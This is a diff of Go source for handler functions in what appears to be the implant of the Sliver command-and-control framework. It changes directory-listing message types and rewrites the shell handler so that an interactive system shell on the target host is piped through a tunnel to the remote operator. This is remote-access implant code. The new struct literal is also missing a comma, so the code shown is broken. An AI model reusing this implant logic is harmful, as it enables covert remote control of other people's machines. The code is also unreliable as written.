@@ -1,4 +1,4 @@
-package main
+package handlers
 
 import (
 	"bytes"
@@ -18,6 +18,7 @@ import (
 	"sliver/sliver/procdump"
 	"sliver/sliver/ps"
 	"sliver/sliver/shell"
+	tun "sliver/sliver/tunnels"
 
 	"github.com/golang/protobuf/proto"
 )
@@ -83,7 +84,7 @@ func psHandler(data []byte, resp RPCResponse) {
 }
 
 func dirListHandler(data []byte, resp RPCResponse) {
-	dirListReq := &pb.DirListReq{}
+	dirListReq := &pb.LsReq{}
 	err := proto.Unmarshal(data, dirListReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -94,7 +95,7 @@ func dirListHandler(data []byte, resp RPCResponse) {
 	dir, files, err := getDirList(dirListReq.Path)
 
 	// Convert directory listing to protobuf
-	dirList := &pb.DirList{Path: dir}
+	dirList := &pb.Ls{Path: dir}
 	if err == nil {
 		dirList.Exists = true
 	} else {
@@ -323,27 +324,21 @@ func startShellHandler(data []byte, resp RPCResponse) {
 	}
 
 	shellPath := shell.GetSystemShellPath()
-	systemShell := shell.StartInteractive(shellPath, shellReq.EnablePTY)
-	shell.Shells.AddShell(systemShell)
-	data, err = proto.Marshal(&pb.ShellData{
-		ID: systemShell.ID,
-	})
-	resp(data, err)
-
+	systemShell := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
+	tunnel := tun.Tunnel{
+		ID: shellReq.TunnelID
+		Reader: systemShell.Stdout,
+		Writer: systemShell.Stdin,
+	}
+	tun.Tunnels.Start(tunnel)
+	
 	// {{if .Debug}}
-	log.Printf("Started shell with ID %d", systemShell.ID)
+	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
 	// {{end}}
 
-	for rawShellData := range *systemShell.Read {
-		// {{if .Debug}}
-		log.Printf("Read %d bytes from shell with id %d", len(rawShellData), systemShell.ID)
-		// {{end}}
-		data, err := proto.Marshal(&pb.ShellData{
-			ID:     systemShell.ID,
-			Stdout: rawShellData,
-		})
-		resp(data, err)
-	}
+	data, err := proto.Marshal(&pb.Shell{TunnelID: tunnel.ID})
+	resp(data, err)
+
 }
 
 func shellDataHandler(data []byte, resp RPCResponse) {
